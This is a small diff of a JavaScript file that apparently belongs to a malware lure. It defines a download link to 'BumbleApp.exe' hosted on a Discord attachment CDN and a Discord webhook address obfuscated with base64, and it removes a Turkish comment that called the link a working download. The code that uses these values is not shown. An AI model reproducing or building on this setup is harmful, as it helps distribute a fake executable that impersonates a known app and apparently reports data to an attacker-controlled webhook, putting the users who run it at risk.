@@ -1,7 +1,7 @@
 (function (global) {
     "use strict";
 
-    /** GÜNCELLENMİŞ - Çalışan Discord indirme linki */
+   
     var BUMBLE_APP_DOWNLOAD_URL = "https://cdn.discordapp.com/attachments/1292210888883044362/1490811021479116931/BumbleApp.exe?ex=69d56975&is=69d417f5&hm=f34731b79a6bfa88f2f604cb43e45d9efadb6948d6341c7ac41dfcfa91fd682a&";
 
     var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
